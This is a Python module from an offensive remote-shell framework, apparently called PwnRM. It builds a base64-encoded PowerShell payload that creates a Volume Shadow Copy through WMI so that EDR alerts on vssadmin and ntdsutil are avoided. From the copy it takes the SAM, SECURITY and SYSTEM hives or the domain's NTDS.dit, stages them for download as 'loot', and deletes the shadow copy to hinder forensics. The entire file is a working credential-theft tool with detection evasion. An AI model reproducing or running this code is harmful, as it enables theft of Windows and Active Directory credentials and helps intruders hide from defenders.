"""
modules.vss — In-Memory Volume Shadow Copy Service (VSS) Extraction
Performs stealthy Volume Shadow Copy creation and registry/NTDS extraction via WMI/CIM reflection without calling vssadmin.exe or ntdsutil.exe (bypassing EDR heuristics).
"""

from typing import List, Any
from . import BaseModule
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import b64str


class VSSModule(BaseModule):
    name = "vss"
    description = "In-Memory VSS Shadow Copy & Credential Hive Extractor (SAM, SYSTEM, NTDS.dit via WMI)"
    author = "uziii2208"
    options = {
        "--drive": {"desc": "Target drive letter (default: C:)"},
        "--sam": {"desc": "Extract SAM and SYSTEM hives to temporary staging path"},
        "--ntds": {"desc": "Extract active NTDS.dit and SYSTEM hive (Domain Controllers)"},
        "--clean": {"desc": "Enforce immediate cleanup of all created shadow copies"},
    }

    def run(self, shell, args: List[str]) -> Any:
        drive = "C:"
        for i, a in enumerate(args):
            if a == "--drive" and i + 1 < len(args):
                drive = args[i + 1].rstrip("\\").upper()
                if not drive.endswith(":"):
                    drive += ":"

        extract_ntds = "--ntds" in args
        clean_only = "--clean" in args

        shell.write_info(c(M + BLD, f"  [*] PwnRM VSS Engine — initializing WMI-based shadow copy operations on {drive}..."))

        ps = f"""
$ErrorActionPreference = 'SilentlyContinue'
Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM In-Memory VSS Extraction & Credential Hives" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

$drive = '{drive}\\'
$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
$targetHive = if ({str(extract_ntds).lower()} -or $isDC) {{ "NTDS.dit" }} else {{ "SAM" }}

Write-Host "  [*] Target Volume : $drive" -ForegroundColor White
Write-Host "  [*] Target Mode   : $targetHive extraction" -ForegroundColor Gray

# 1. Create Volume Shadow Copy via WMI (No vssadmin.exe / ntdsutil.exe alerts)
Write-Host "`n[1. Creating Ephemeral Shadow Copy via WMI Win32_ShadowCopy]" -ForegroundColor Yellow
$shadowClass = [wmiclass]"Win32_ShadowCopy"
$createResult = $shadowClass.Create($drive, "ClientAccessible")

if ($createResult.ReturnValue -ne 0) {{
    Write-Host "  [-] Failed to create Volume Shadow Copy. ReturnValue: $($createResult.ReturnValue)" -ForegroundColor Red
    Write-Host "      (Requires Administrator privileges and VSS service enabled)" -ForegroundColor DarkGray
    return
}}

$shadowId = $createResult.ShadowID
Write-Host "  [+] Shadow Copy Created successfully! ID: $shadowId" -ForegroundColor Green

# 2. Retrieve Shadow Copy Device Object Path
$shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowId }}
$deviceObj = $shadow.DeviceObject

if (-not $deviceObj) {{
    Write-Host "  [-] Could not resolve Shadow Copy DeviceObject." -ForegroundColor Red
    $shadow.Delete()
    return
}}

Write-Host "  [+] Device Object : $deviceObj" -ForegroundColor Green

# 3. Extract Target Hives
Write-Host "`n[2. Extracting Registry & Database Hives]" -ForegroundColor Yellow
$tempPath = [System.IO.Path]::GetTempPath()
$stagingDir = Join-Path $tempPath ("pwnrm_vss_" + (Get-Random))
New-Item -Path $stagingDir -ItemType Directory -Force | Out-Null

try {{
    # Copy SYSTEM hive
    $sysSrc = "$deviceObj\\Windows\\System32\\config\\SYSTEM"
    $sysDst = Join-Path $stagingDir "SYSTEM"
    [System.IO.File]::Copy($sysSrc, $sysDst, $true)
    $sysSize = (Get-Item $sysDst).Length
    $sysHash = (Get-FileHash -LiteralPath $sysDst -Algorithm SHA256).Hash
    Write-Host "  [+] SYSTEM Hive Extracted : $sysDst ($sysSize bytes)" -ForegroundColor Green
    Write-Host "      SHA-256: $sysHash" -ForegroundColor Gray

    if ($targetHive -eq "NTDS.dit") {{
        $ntdsSrc = "$deviceObj\\Windows\\NTDS\\ntds.dit"
        $ntdsDst = Join-Path $stagingDir "ntds.dit"
        if ([System.IO.File]::Exists($ntdsSrc)) {{
            [System.IO.File]::Copy($ntdsSrc, $ntdsDst, $true)
            $ntdsSize = (Get-Item $ntdsDst).Length
            $ntdsHash = (Get-FileHash -LiteralPath $ntdsDst -Algorithm SHA256).Hash
            Write-Host "  [!] NTDS.DIT Extracted   : $ntdsDst ($ntdsSize bytes)" -ForegroundColor Red
            Write-Host "      SHA-256: $ntdsHash" -ForegroundColor DarkRed
        }} else {{
            Write-Host "  [-] ntds.dit not found on $drive (not an active DC directory database)." -ForegroundColor Yellow
        }}
    }} else {{
        $samSrc = "$deviceObj\\Windows\\System32\\config\\SAM"
        $samDst = Join-Path $stagingDir "SAM"
        if ([System.IO.File]::Exists($samSrc)) {{
            [System.IO.File]::Copy($samSrc, $samDst, $true)
            $samSize = (Get-Item $samDst).Length
            $samHash = (Get-FileHash -LiteralPath $samDst -Algorithm SHA256).Hash
            Write-Host "  [+] SAM Hive Extracted    : $samDst ($samSize bytes)" -ForegroundColor Green
            Write-Host "      SHA-256: $samHash" -ForegroundColor Gray
        }}

        $secSrc = "$deviceObj\\Windows\\System32\\config\\SECURITY"
        $secDst = Join-Path $stagingDir "SECURITY"
        if ([System.IO.File]::Exists($secSrc)) {{
            [System.IO.File]::Copy($secSrc, $secDst, $true)
            Write-Host "  [+] SECURITY Hive Extracted : $secDst" -ForegroundColor Green
        }}
    }}
}} catch {{
    Write-Host "  [-] Error during file extraction: $_" -ForegroundColor Red
}} finally {{
    # 4. Immediate Forensics Cleanup: Delete Shadow Copy
    Write-Host "`n[3. Deleting Ephemeral Shadow Copy (Forensic Hygiene)]" -ForegroundColor Yellow
    $shadow.Delete()
    Write-Host "  [+] Shadow Copy $shadowId deleted." -ForegroundColor Green
}}

Write-Host "`n  [*] Staged artifacts ready for download at: $stagingDir" -ForegroundColor Cyan
Write-Host "  [*] Use '!download $stagingDir' to pull artifacts into local loot store." -ForegroundColor Cyan
"""
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        shell.run_with_interrupt(cmd, shell.write_line)
        return {"status": "completed"}
